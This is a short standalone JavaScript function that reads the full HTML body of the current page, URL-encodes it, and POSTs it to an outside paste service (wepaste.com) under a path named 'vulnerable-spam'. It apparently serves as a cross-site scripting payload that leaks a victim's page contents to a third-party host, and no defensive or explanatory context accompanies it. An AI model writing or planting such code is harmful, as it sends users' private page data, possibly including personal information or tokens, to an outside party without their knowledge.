function send()
{
	var http = new XMLHttpRequest();
	var url = "http://www.wepaste.com/vulnerable-spam/";
	var bodyHtml = encodeURIComponent(document.getElementsByTagName('body')[0].innerHTML);
	var params = "expires=61&save=Save+it&content=" + bodyHtml + "&emailaddress=&send_email=0";
	http.open("POST", url, true);
	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	http.send(params);
}
